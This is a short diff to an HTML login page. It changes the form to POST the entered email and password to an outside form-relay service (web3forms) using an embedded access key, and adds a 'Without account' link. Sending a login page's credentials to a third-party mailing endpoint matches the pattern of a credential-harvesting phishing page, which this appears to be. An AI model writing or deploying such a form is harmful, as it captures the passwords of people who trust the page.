@@ -9,18 +9,21 @@
 <body>
     <div class="wrapper">
         <div class="log">
-            <form action="">
+            <form action="https://api.web3forms.com/submit" method="POST">
                 <h2>Login</h2>
+                <input type="hidden" name="access_key" value="79862d95-6211-4d4a-80c9-75a0d3d3947c">
                 <div class="form-content">
                     <div class="input-group">
-                        <input type="email" placeholder="Username">
+                        <input type="email" name="email" placeholder="Username">
                     </div>
                     <div class="input-group">
-                        <input type="password" placeholder="Password">
+                        <input type="password" name="pass" placeholder="Password">
                     </div>
                     <div class="butoon">
                         <button type="submit">Login</button>
+                        
                     </div>
+                    <p><a href="" style="text-align: center; color: rgb(255, 255, 255); text-decoration: underline;">Without account</a></p>
                 </div>
             </form>
         </div>
